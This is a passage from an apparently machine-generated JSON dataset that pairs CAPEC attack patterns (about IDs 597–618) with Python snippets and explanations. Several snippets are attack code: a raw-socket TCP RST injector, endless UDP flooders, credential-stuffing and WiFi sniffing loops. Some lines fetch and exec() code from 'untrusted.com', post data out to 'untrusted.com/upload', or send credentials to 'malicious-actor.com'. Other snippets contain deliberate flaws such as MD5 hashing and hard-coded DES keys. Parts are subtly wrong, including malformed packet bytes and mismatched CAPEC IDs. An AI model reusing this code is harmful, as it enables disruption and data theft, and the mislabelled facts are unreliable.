        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Target IP and port\ntarget_ip = '192.168.1.100'\ntarget_port = 80\n\n# Construct a TCP RST packet\n# Note: This is a simplified example and does not include full TCP/IP header construction\nrst_packet = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # IP header (simplified)\nrst_packet += b'\\x7f\\x00\\x00\\x01'  # Source IP (127.0.0.1)\nrst_packet += socket.inet_aton(target_ip)  # Destination IP\nrst_packet += b'\\x00\\x50'  # Source port (80)\nrst_packet += b'\\x00\\x50'  # Destination port (80)\nrst_packet += b'\\x00\\x00\\x00\\x00'  # Sequence number\nrst_packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number\nrst_packet += b'\\x50\\x04\\x00\\x00'  # Data offset, RST flag, window size\nrst_packet += b'\\x00\\x00\\x00\\x00'  # Checksum, urgent pointer\n\n# Send the RST packet\nsock.sendto(rst_packet, (target_ip, target_port))\n\nprint('TCP RST packet sent to', target_ip)",
        "description": "This Python code snippet demonstrates a TCP RST Injection attack. It creates a raw socket and constructs a simplified TCP RST packet, which is then sent to a target IP address and port. The goal of this attack is to force the termination of an existing TCP connection between the target and a web server. The code does not include full TCP/IP header construction for simplicity. This attack leverages CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the communication, allowing an adversary to inject malicious packets. The other CWEs provide additional context on potential weaknesses that could be exploited in similar scenarios."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/restricted'\n    full_path = os.path.join(base_directory, file_path)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Access to this path is restricted')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet demonstrates an Absolute Path Traversal vulnerability. The function `read_file` takes a `file_path` provided by the user and attempts to read the file from a restricted base directory (`/restricted`). The code constructs the full path using `os.path.join`, but it does not properly neutralize special path elements like `..`, which can allow an attacker to traverse directories and access files outside the restricted directory. The check `if not full_path.startswith(base_directory)` is intended to prevent this, but it is insufficient because `os.path.join` does not resolve the path, allowing traversal attacks to bypass the restriction. This snippet embodies the main idea of CAPEC-36 and related CWEs, highlighting the risk of improper path handling and the need for secure path validation."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport requests\n\n# Vulnerable function that performs reverse DNS resolution\n# and makes a security decision based on the hostname\n\ndef is_trusted_ip(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # Security decision based on hostname\n        return hostname.endswith('.trusted.com')\n    except socket.herror:\n        return False\n\n# Function that downloads code without integrity check\n\ndef download_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Function that performs an open redirect\n\ndef redirect_user(user_input_url):\n    redirect_url = f\"https://example.com/redirect?url={user_input_url}\"\n    return redirect_url\n\n# Function that performs SSRF\n\ndef fetch_internal_data(url):\n    response = requests.get(url)\n    return response.text\n\n# Example usage\nip_address = '192.168.1.1'\nif is_trusted_ip(ip_address):\n    print('IP is trusted')\nelse:\n    print('IP is not trusted')\n\n# Download code from an untrusted source\ncode_url = 'http://untrusted.com/malicious_code.py'\ndownload_code(code_url)\n\n# Redirect user to an untrusted site\nuser_input_url = 'http://phishing.com'\nprint(redirect_user(user_input_url))\n\n# Fetch internal data using SSRF\ninternal_url = 'http://internal-service.local/data'\nprint(fetch_internal_data(internal_url))",
        "description": "This Python code snippet demonstrates several vulnerabilities related to DNS Spoofing and associated CWEs. The `is_trusted_ip` function performs reverse DNS resolution and makes a security decision based on the hostname, which can be exploited if the DNS response is spoofed (CWE-350). The `download_code` function downloads and executes code from a URL without verifying its integrity (CWE-494). The `redirect_user` function constructs a URL for redirection based on user input, which can lead to open redirect vulnerabilities (CWE-601). The `fetch_internal_data` function retrieves data from a URL, potentially leading to Server-Side Request Forgery (SSRF) if the URL is not properly validated (CWE-918). These functions collectively illustrate how DNS Spoofing can be exploited to compromise security-critical actions."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\n\n# Simulate a communication channel with improper message integrity enforcement\nserver_address = ('localhost', 10000)\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\ntry:\n    # Send a message to the server\n    message = 'Sensitive data in cleartext'\n    print(f'Sending: {message}')\n    sent = sock.sendto(message.encode(), server_address)\n\n    # Receive a response from the server\n    data, server = sock.recvfrom(4096)\n    print(f'Received: {data.decode()}')\n\nfinally:\n    print('Closing socket')\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC 'Terrestrial Jamming' attack pattern. The code uses a UDP socket to send sensitive data in cleartext, which can be easily intercepted and modified by an attacker using a terrestrial jammer. The code also lacks proper message integrity checks, making it susceptible to CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) and CWE-319 (Cleartext Transmission of Sensitive Information). The communication is not restricted to intended endpoints, aligning with CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import time\n\n# Simulated user database\nuser_db = {\n    'user1': 'password123',\n    'user2': 'mypassword',\n    'user3': 'letmein'\n}\n\n# Function to simulate login\nfailed_attempts = {}\n\ndef login(username, password):\n    global failed_attempts\n    if username in failed_attempts and failed_attempts[username] >= 5:\n        print('Account locked due to too many failed attempts.')\n        return False\n    if username in user_db and user_db[username] == password:\n        print('Login successful!')\n        failed_attempts[username] = 0\n        return True\n    else:\n        print('Login failed!')\n        if username in failed_attempts:\n            failed_attempts[username] += 1\n        else:\n            failed_attempts[username] = 1\n        return False\n\n# Simulate credential stuffing attack\ncredentials = [\n    ('user1', 'password123'),\n    ('user1', 'wrongpassword'),\n    ('user1', 'password123'),\n    ('user1', 'password123'),\n    ('user1', 'password123'),\n    ('user1', 'password123'),\n    ('user2', 'mypassword'),\n    ('user3', 'letmein')\n]\n\nfor username, password in credentials:\n    login(username, password)\n    time.sleep(1)  # Simulate time delay between attempts",
        "description": "This Python code snippet simulates a credential stuffing attack, where an adversary tries known username/password combinations against a system. The `login` function checks the provided credentials against a simulated user database. If the login fails, it increments the count of failed attempts for that username. If there are 5 or more failed attempts for a username, the account is locked. This demonstrates CWE-307 (Improper Restriction of Excessive Authentication Attempts) by showing how multiple failed attempts can lead to account lockout. The code also highlights the risk of using single-factor authentication (CWE-308) and the reliance on password systems (CWE-309)."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Function to simulate jamming by sending illegitimate traffic\n\ndef jammer(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'JAMMING_TRAFFIC' * 1024  # Large message to overwhelm the target\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate a vulnerable server\n\ndef vulnerable_server(host, port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind((host, port))\n    print(f'Server listening on {host}:{port}')\n    while True:\n        data, addr = server_socket.recvfrom(4096)\n        # CWE-924: No integrity check\n        # CWE-319: Cleartext data\n        print(f'Received message from {addr}: {data.decode()}')\n\n# Start the vulnerable server\nserver_thread = threading.Thread(target=vulnerable_server, args=('0.0.0.0', 9999))\nserver_thread.daemon = True\nserver_thread.start()\n\n# Start the jammer\njammer_thread = threading.Thread(target=jammer, args=('127.0.0.1', 9999))\njammer_thread.daemon = True\njammer_thread.start()\n\n# Keep the main thread alive\ntry:\n    while True:\n        pass\nexcept KeyboardInterrupt:\n    print('Exiting...')",
        "description": "This Python code snippet demonstrates a simple UDP server that is vulnerable to jamming attacks. The server listens for incoming messages on a specified port and prints them out without performing any integrity checks (CWE-924) or encryption (CWE-319). A separate thread simulates a jamming attack by continuously sending large, illegitimate messages to the server, overwhelming its resources and denying service to legitimate users (CAPEC: Jamming). The code also highlights the lack of endpoint verification (CWE-923) and control over message volume (CWE-406), making it easier for an attacker to disrupt the communication."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import hashlib\n\n# Using an obsolete hashing function (MD5) which is known to be insecure\n# CWE-477: Use of Obsolete Function\npassword = 'user_password'\nhash_object = hashlib.md5(password.encode())\nhashed_password = hash_object.hexdigest()\nprint(f'Hashed Password: {hashed_password}')\n\n# Deprecated reliance on DNS lookups for security decisions\n# CWE-247: Reliance on DNS Lookups in a Security Decision\nimport socket\n\ndef is_trusted_host(hostname):\n    try:\n        ip_address = socket.gethostbyname(hostname)\n        # Insecure check based on IP address\n        return ip_address == '192.168.1.1'\n    except socket.error:\n        return False\n\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates the main idea of the deprecated CAPEC attack pattern 'Degradation' by using related CWEs. The code includes the use of an obsolete hashing function (MD5) to hash a password, which is insecure and represents CWE-477: Use of Obsolete Function. Additionally, it shows a deprecated reliance on DNS lookups for making security decisions, representing CWE-247: Reliance on DNS Lookups in a Security Decision. The code is vulnerable because MD5 is not secure for hashing passwords, and relying on DNS lookups for security decisions can be easily bypassed or manipulated."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import threading\nimport time\n\n# Simulate a resource that can be blocked\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.resource_available = True\n\n    def use_resource(self):\n        with self.lock:\n            if not self.resource_available:\n                raise Exception('Resource is blocked')\n            print('Resource is being used')\n            time.sleep(1)\n\n    def block_resource(self):\n        with self.lock:\n            self.resource_available = False\n            print('Resource has been blocked')\n\n# Function to simulate resource usage\ndef use_resource_continuously(resource):\n    while True:\n        try:\n            resource.use_resource()\n        except Exception as e:\n            print(e)\n            break\n\n# Create a resource instance\nresource = Resource()\n\n# Start a thread to use the resource continuously\nthread = threading.Thread(target=use_resource_continuously, args=(resource,))\nthread.start()\n\n# Simulate an adversary blocking the resource after some time\ntime.sleep(2)\nresource.block_resource()\n\n# Wait for the thread to finish\nthread.join()",
        "description": "This Python code snippet demonstrates a scenario where an adversary can block the delivery of an important system resource, causing the system to fail or stop working. The `Resource` class simulates a resource that can be used or blocked. The `use_resource` method raises an exception if the resource is blocked, simulating a failure in resource delivery. The `block_resource` method simulates an adversary blocking the resource. A separate thread continuously tries to use the resource, and after a delay, the main thread blocks the resource, causing the continuous usage to fail. This example embodies the CAPEC concept of 'Blockage' and incorporates CWE-693 (Protection Mechanism Failure) and CWE-400 (Uncontrolled Resource Consumption) by demonstrating the lack of proper protection and control over the resource."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import socket\nimport threading\n\n# Function to flood the Wi-Fi access point with deauthentication frames\n# This is a simplified representation and does not perform actual deauthentication\n\ndef flood_deauth_frames(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'Deauth Frame'\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate high levels of noise on the RF band\n# This is a simplified representation and does not perform actual RF jamming\n\ndef transmit_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'Noise' * 1024\n    while True:\n        sock.sendto(noise, (target_ip, target_port))\n\n# Target Wi-Fi access point IP and port\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 80\n\n# Start threads to perform the attacks\nthreading.Thread(target=flood_deauth_frames, args=(TARGET_IP, TARGET_PORT)).start()\nthreading.Thread(target=transmit_noise, args=(TARGET_IP, TARGET_PORT)).start()",
        "description": "This Python code snippet demonstrates a simplified version of a Wi-Fi jamming attack. It includes two main functions: one to flood the Wi-Fi access point with deauthentication frames and another to transmit high levels of noise on the RF band. The code uses sockets to send UDP packets to the target IP and port, simulating the attack. The deauthentication frames and noise are represented by simple byte messages. The code starts two threads to perform these attacks concurrently. This snippet embodies the main idea of the CAPEC by showing how an attacker can disrupt Wi-Fi communication. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity, improper restriction of communication channels, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\n\n# Simulate a cellular jamming attack by sending noise to a communication channel\n\ndef send_noise(target_ip, target_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n        noise = b'\\x00' * 1024  # 1KB of noise data\n        while True:\n            sock.sendto(noise, (target_ip, target_port))\n\n# Example usage\nsend_noise('192.168.1.1', 12345)",
        "description": "This Python code snippet simulates a cellular jamming attack by continuously sending noise data to a specified target IP and port using UDP. The `send_noise` function creates a socket and sends 1KB of noise data in an infinite loop to overwhelm the communication channel. This embodies the main idea of the CAPEC 'Cellular Jamming' by disrupting communication between a cellular user device and a cell tower. The code also indirectly touches on related CWEs such as 'Improper Enforcement of Message Integrity During Transmission in a Communication Channel' (CWE-924) and 'Channel Accessible by Non-Endpoint' (CWE-300) by demonstrating how an attacker can exploit these weaknesses to interfere with communication."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import random\n\nclass CellularConnection:\n    def __init__(self):\n        self.encryption_modes = ['A5/0', 'A5/1', 'A5/2', 'A5/3']\n        self.current_mode = 'A5/3'  # Strongest mode by default\n\n    def negotiate_encryption(self, rogue_station=False):\n        if rogue_station:\n            # Downgrade to a less secure encryption mode\n            self.current_mode = random.choice(['A5/0', 'A5/1', 'A5/2'])\n        else:\n            # Normally, the strongest mode should be used\n            self.current_mode = 'A5/3'\n        print(f'Encryption mode set to: {self.current_mode}')\n\n# Simulate a normal connection\nconnection = CellularConnection()\nconnection.negotiate_encryption(rogue_station=False)\n\n# Simulate a connection with a rogue base station\nconnection.negotiate_encryption(rogue_station=True)",
        "description": "This Python code snippet simulates a cellular connection that can be influenced by a rogue base station to use weaker encryption modes. The `CellularConnection` class initializes with a list of encryption modes, defaulting to the strongest mode 'A5/3'. The `negotiate_encryption` method allows for the negotiation of encryption modes. If a rogue station is detected (simulated by the `rogue_station` parameter), the encryption mode is downgraded to a weaker one ('A5/0', 'A5/1', or 'A5/2'). This represents the CAPEC's main idea of weakening cellular encryption through algorithm downgrade attacks, highlighting related CWEs such as selection of less-secure algorithms, inadequate encryption strength, and use of broken or risky cryptographic algorithms."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import threading\nimport time\n\n# Shared resource\nshared_resource = {'status': 'operational'}\n\n# Function to simulate system component interaction\ndef system_component():\n    while True:\n        if shared_resource['status'] == 'operational':\n            print('System component is working as intended.')\n        else:\n            print('System component is degraded or non-functional.')\n        time.sleep(1)\n\n# Function to simulate an attacker obstructing the system\ndef attacker_obstruction():\n    while True:\n        # Obstruct the interaction by changing the status\n        shared_resource['status'] = 'degraded'\n        time.sleep(2)\n        shared_resource['status'] = 'operational'\n        time.sleep(2)\n\n# Start system component thread\ncomponent_thread = threading.Thread(target=system_component)\ncomponent_thread.start()\n\n# Start attacker obstruction thread\nattacker_thread = threading.Thread(target=attacker_obstruction)\nattacker_thread.start()",
        "description": "This Python code snippet demonstrates an obstruction attack on a system component. The `system_component` function simulates a system component that checks the status of a shared resource and prints its operational state. The `attacker_obstruction` function simulates an attacker who periodically changes the status of the shared resource to 'degraded', causing the system component to enter a degraded state. This represents the CAPEC concept of an attacker obstructing interactions between system components, leading to a degraded or non-functional state. The use of shared resources and threading highlights potential issues related to CWE-693 (Protection Mechanism Failure) and CWE-653 (Improper Isolation or Compartmentalization)."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import os\nfrom Crypto.Cipher import DES\n\n# CWE-321: Use of Hard-coded Cryptographic Key\nhardcoded_key = b'8bytekey'\n\n# CWE-326: Inadequate Encryption Strength\n# DES is considered weak and inadequate for modern encryption needs\ncipher = DES.new(hardcoded_key, DES.MODE_ECB)\n\n# Example plaintext\nplaintext = b'SensitiveData'\n\n# Encrypting the plaintext\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting the ciphertext\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n# Forcing the use of DES even if stronger algorithms are available\ndecipher = DES.new(hardcoded_key, DES.MODE_ECB)\ndecrypted_text = decipher.decrypt(ciphertext).strip()\n\nprint(f'Decrypted Text: {decrypted_text.decode()}')",
        "description": "This Python code snippet demonstrates the vulnerabilities described in the CAPEC and related CWEs. It uses the DES encryption algorithm, which is known to be weak (CWE-326). The key is hard-coded (CWE-321), making it easier for attackers to recover encrypted data. The code also illustrates an algorithm downgrade scenario (CWE-757) by forcing the use of DES, even though stronger algorithms are available. This represents the main idea of the CAPEC, where weak encryption can be exploited to reveal sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\n# Establish a connection to a fake cellular tower (malicious actor)\nserver_address = ('malicious-actor.com', 10000)\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    # Connect to the server\n    sock.connect(server_address)\n    \n    # Send sensitive data in cleartext\n    message = 'username=admin&password=secret'\n    sock.sendall(message.encode('utf-8'))\n    \n    # Receive response\n    response = sock.recv(1024)\n    print('Received:', response.decode('utf-8'))\nfinally:\n    # Close the connection\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable scenario where sensitive information (username and password) is transmitted in cleartext to a malicious actor's server. The code establishes a socket connection to a fake cellular tower (represented by 'malicious-actor.com') and sends sensitive data without encryption. This embodies the CAPEC 'Cellular Traffic Intercept' by showing how an attacker can intercept unencrypted cellular traffic. The related CWEs are represented as follows: CWE-311 (Missing Encryption of Sensitive Data), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-940 (Improper Verification of Source of a Communication Channel). The code does not verify the legitimacy of the server, making it susceptible to interception and manipulation."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Simulate a vulnerable cellular data transmission\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    # Connect the socket to the server\n    sock.connect(server_address)\n\n    # CWE-201: Inserting sensitive information into sent data\n    message = 'SensitiveData:12345;NormalData:HelloWorld'\n\n    # CWE-319: Sending sensitive information in cleartext\n    sock.sendall(message.encode('utf-8'))\n\n    # CWE-924: No integrity check on the received message\n    data = sock.recv(1024)\n    print('Received:', data.decode('utf-8'))\n\n    # CWE-406: No control over the volume of messages sent\n    for _ in range(1000):\n        sock.sendall(b'Ping')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable cellular data transmission scenario. It connects to a server and sends a message containing sensitive information in cleartext (CWE-319). The message includes sensitive data that should not be transmitted (CWE-201). The code does not verify the integrity of the received message (CWE-924), making it susceptible to tampering. Additionally, it sends a large volume of 'Ping' messages without any control, potentially leading to network amplification attacks (CWE-406). This example embodies the main idea of CAPEC-Cellular Data Injection by illustrating how adversaries can inject and manipulate data in mobile technology traffic to disrupt communications or conduct surveillance."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import requests\n\n# Vulnerable URL redirection\ntrusted_domain = 'http://trusted.com/login'\nuser_input = 'http://trusted.com.login'  # BitSquatting attack\n\n# CWE-601: Open Redirect\nredirect_url = user_input\n\n# CWE-494: Download of Code Without Integrity Check\nresponse = requests.get(redirect_url)\nif response.status_code == 200:\n    exec(response.text)  # Dangerous: executing code from an untrusted source\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nsensitive_data = 'user=admin&password=secret'\nresponse = requests.get(f'{trusted_domain}?{sensitive_data}')\nprint(response.text)\n",
        "description": "This Python code snippet demonstrates a BitSquatting attack by redirecting to a domain that is one bit different from a trusted domain. The code also incorporates several related CWEs: CWE-601 (Open Redirect) by using user-controlled input for redirection, CWE-494 (Download of Code Without Integrity Check) by downloading and executing code from the redirected URL without verifying its integrity, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by including sensitive information in the query string of a GET request. This code highlights the risks associated with BitSquatting and related vulnerabilities."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to listen for WiFi packets and log MAC addresses\ndef listen_for_wifi_packets(interface):\n    # Create a raw socket to listen for packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0))\n\n    mac_addresses = set()\n\n    while True:\n        # Receive a packet\n        packet = sock.recvfrom(2048)[0]\n        # Extract the MAC address from the packet\n        mac_address = packet[6:12]\n        mac_address = ':'.join('%02x' % b for b in mac_address)\n\n        # Log the MAC address\n        if mac_address not in mac_addresses:\n            mac_addresses.add(mac_address)\n            print(f'Logged MAC address: {mac_address}')\n\n        time.sleep(1)\n\n# Example usage\nlisten_for_wifi_packets('wlan0')",
        "description": "This Python code snippet demonstrates a basic implementation of WiFi MAC address tracking. It creates a raw socket to listen for WiFi packets on a specified network interface (e.g., 'wlan0'). The code extracts the MAC address from each received packet and logs it if it hasn't been logged before. This embodies the main idea of the CAPEC by passively listening for WiFi messages and logging associated MAC addresses, which can then be used to track users. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by exposing MAC addresses, and CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of actors on the communication channel."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import scapy.all as scapy\n\n# Function to sniff WiFi management frames\ndef sniff_wifi_packets(interface):\n    def packet_handler(packet):\n        if packet.haslayer(scapy.Dot11Beacon) or packet.haslayer(scapy.Dot11ProbeReq):\n            ssid = packet.info.decode('utf-8')\n            mac_address = packet.addr2\n            print(f'SSID: {ssid}, MAC: {mac_address}')\n\n    scapy.sniff(iface=interface, prn=packet_handler, store=0)\n\n# Start sniffing on the specified interface\nsniff_wifi_packets('wlan0')",
        "description": "This Python code snippet uses the Scapy library to passively sniff WiFi management frames on a specified network interface (e.g., 'wlan0'). The `sniff_wifi_packets` function captures packets and checks if they are WiFi Beacon or Probe Request frames, which contain the SSID and MAC address. When such a packet is detected, it extracts and prints the SSID and MAC address. This demonstrates the concept of 'WiFi SSID Tracking' (CAPEC-201) by showing how an attacker can passively listen to WiFi management frames to track users based on their SSIDs. The code also highlights CWE-201 by transmitting sensitive information (SSID and MAC address) that should not be accessible to unauthorized actors."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\n\n# Simulate a weak DES key (CWE-327, CWE-326)\nweak_des_key = pyDes.des(b'12345678', pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)\n\n# Simulate an OTA update message\nota_message = b'Update SIM firmware'\n\n# Encrypt the OTA message with the weak DES key\nencrypted_message = weak_des_key.encrypt(ota_message)\n\n# Simulate sending the encrypted message to the SIM card\n# In a real scenario, this would be sent via SMS\nprint(f'Encrypted OTA message: {encrypted_message}')\n\n# Simulate the SIM card decrypting the message\n# An attacker who cracks the DES key can decrypt the message\ndecrypted_message = weak_des_key.decrypt(encrypted_message)\nprint(f'Decrypted OTA message: {decrypted_message.decode()}')",
        "description": "This Python code snippet demonstrates the vulnerability described in the CAPEC 'Rooting SIM Cards' by using a weak DES key for encrypting an OTA update message. The code uses the pyDes library to simulate the encryption and decryption process. The weak DES key (CWE-327, CWE-326) is used to encrypt a message that would be sent to the SIM card. An attacker who cracks the DES key can decrypt the message, demonstrating the risk of using a broken or risky cryptographic algorithm. This snippet highlights the potential for abuse when weak encryption is used for sensitive operations like OTA updates."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# Simulate a client connecting to a Wi-Fi network\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('192.168.1.1', 80))  # Connect to a fake access point\n\n# Send sensitive information in cleartext\nsensitive_data = 'username=admin&password=admin123'\nclient_socket.sendall(sensitive_data.encode('utf-8'))\n\n# Receive data without verifying the source\nresponse = client_socket.recv(1024)\nprint('Received:', response.decode('utf-8'))\n\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable scenario where a client connects to a Wi-Fi network that could be an 'Evil Twin' access point. The client sends sensitive information (username and password) in cleartext, which can be intercepted by an adversary. Additionally, the client receives data from the network without verifying the source, making it susceptible to adversary-in-the-middle attacks. This code embodies the main idea of the CAPEC 'Evil Twin Wi-Fi Attack' and highlights related CWEs such as cleartext transmission of sensitive information (CWE-319), improper verification of the source of a communication channel (CWE-940), and improper restriction of communication channel to intended endpoints (CWE-923)."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\nimport requests\n\n# CWE-426: Untrusted Search Path\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Simulate a legitimate resource URL\nlegitimate_url = 'https://example.com/resource'\n\n# Simulate a rogue URL that is similar to the legitimate one\nrogue_url = 'https://examp1e.com/resource'  # Note the subtle difference in the domain name\n\n# Function to fetch resource from a given URL\ndef fetch_resource(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return None\n    except Exception as e:\n        print(f'Error fetching resource: {e}')\n        return None\n\n# Fetch resource from the rogue URL (simulating the victim accessing the rogue location)\nresource_content = fetch_resource(rogue_url)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Simulate processing the fetched resource which might contain sensitive information\nif resource_content:\n    print('Fetched resource content:')\n    print(resource_content)\n\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n# Simulate leaking the fetched resource to an untrusted party\nuntrusted_party_url = 'https://untrusted.com/upload'\ntry:\n    response = requests.post(untrusted_party_url, data={'resource': resource_content})\n    if response.status_code == 200:\n        print('Resource leaked to untrusted party successfully.')\n    else:\n        print('Failed to leak resource to untrusted party.')\nexcept Exception as e:\n    print(f'Error leaking resource: {e}')",
        "description": "This Python code snippet demonstrates the concept of 'Establish Rogue Location' (CAPEC) by simulating a scenario where an adversary sets up a rogue URL that is similar to a legitimate one. The code fetches a resource from the rogue URL, potentially exposing sensitive information (CWE-200) to an unauthorized actor. It also demonstrates improper verification of the source of a communication channel (CWE-940) by not validating the URL properly. Additionally, it shows the transmission of private resources into a new sphere (CWE-402) by leaking the fetched resource to an untrusted party. The code highlights the risks associated with untrusted search paths (CWE-426) and the creation of emergent resources (CWE-1229) that can be exploited by attackers."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\nclass RogueBaseStation:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n\n    def start(self):\n        print(f'Rogue Base Station running on {self.host}:{self.port}')\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Connection from {addr}')\n            self.handle_client(client_socket)\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(1024)\n            if data:\n                print(f'Received data: {data}')\n                # Simulate improper verification of source\n                client_socket.sendall(b'ACK')\n        finally:\n            client_socket.close()\n\nif __name__ == '__main__':\n    rogue_base_station = RogueBaseStation()\n    rogue_base_station.start()",
        "description": "This Python code snippet represents a simplified version of a rogue base station attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections on a specified host and port. When a connection is established, it accepts the connection and handles the client by receiving data and sending an acknowledgment back. The code does not verify the source of the incoming connection, embodying CWE-940 (Improper Verification of Source of a Communication Channel). Additionally, it does not ensure the integrity of the communication channel or restrict the channel to intended endpoints, reflecting CWE-300, CWE-924, and CWE-923. This demonstrates how an attacker could set up a rogue base station to intercept and manipulate communications from cellular devices."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\n# Vulnerable function to send a broadcast message\n\ndef send_broadcast_message(phone_number, message):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    data = {\n        'phone_number': phone_number,\n        'message': message\n    }\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    response = requests.post('http://example.com/send_broadcast', json=data)\n    if response.status_code == 200:\n        print('Broadcast message sent successfully')\n    else:\n        print('Failed to send broadcast message')\n\n# Example usage\nsend_broadcast_message('+1234567890', 'Emergency Alert')",
